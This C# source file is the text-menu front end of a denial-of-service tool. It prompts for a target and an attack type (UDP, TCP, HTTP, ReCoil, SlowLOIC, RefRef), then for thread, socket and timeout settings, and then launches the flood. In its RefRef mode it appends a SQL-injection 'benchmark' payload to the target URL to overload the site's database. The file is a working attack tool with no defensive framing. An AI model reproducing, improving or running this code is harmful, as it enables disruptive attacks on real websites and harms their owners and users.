using System;
using System.Text;
namespace GAS.TUI
{
    class Program
    {
        static GAS.Core.Manager Core = new GAS.Core.Manager();
        public static void Main(string[] args)
        {
            Console.WriteLine("Select target");
            string temp = Console.ReadLine();
            bool IPOK = Core.LockOn(temp);
            if (!IPOK)
            {
                Console.WriteLine("Wrong Target!");
                Environment.Exit(1);
            }
            Console.WriteLine("Subsite is {0}, do you want to change it?[y/n]", Core.Subsite);
            if (Console.ReadLine().ToLower()[0] == 'y')
                Core.Subsite = Console.ReadLine();
            Console.WriteLine("Select attack type [UDP/TCP/HTTP/ReCoil/SlowLOIC/RefRef]");
            temp = Console.ReadLine();
            if (temp != "RefRef")
                Core.Method = (GAS.Core.AttackMethod) Enum.Parse(typeof(GAS.Core.AttackMethod), temp);
            else
            {
                Core.Method = GAS.Core.AttackMethod.HTTP;
                Core.Subsite += " and (select+benchmark(99999999999,0x70726f62616e646f70726f62616e646f70726f62616e646f))";
            }
            Console.WriteLine("Enter port[80]");
            Core.Port = int.Parse(Console.ReadLine());
            Console.WriteLine("Enter timeout[30]");
            Core.Timeout = int.Parse(Console.ReadLine());
            Console.WriteLine("Enter thread count[10]");
            Core.Threads = int.Parse(Console.ReadLine());
            Console.WriteLine("Enter sockets per thread [50]");
            Core.SPT = int.Parse(Console.ReadLine());
            Console.WriteLine("USE Get [true]");
            Core.USEGet = bool.Parse(Console.ReadLine());
            Console.WriteLine("USE GZIP [true]");
            Core.UseGZIP = bool.Parse(Console.ReadLine());
            Console.WriteLine("Enter delay [0]");
            Core.Delay = int.Parse(Console.ReadLine());
            Console.WriteLine("Wait    For Response [false] ");
            Core.WaitForResponse = bool.Parse(Console.ReadLine());
            Console.WriteLine("Append RANDOMC hars [true]");
            Core.AppendRANDOMChars = bool.Parse(Console.ReadLine());
            Console.WriteLine("Append RANDOM Chars 2 Url [true]");
            Core.AppendRANDOMCharsUrl = bool.Parse(Console.ReadLine());
            Console.WriteLine("Starting attack");
            Core.Start();
            Console.WriteLine("Attacking...");
            Console.WriteLine("Press Enter stop attack and exit");
            Console.ReadLine();
            Core.Stop();
        }
    }
}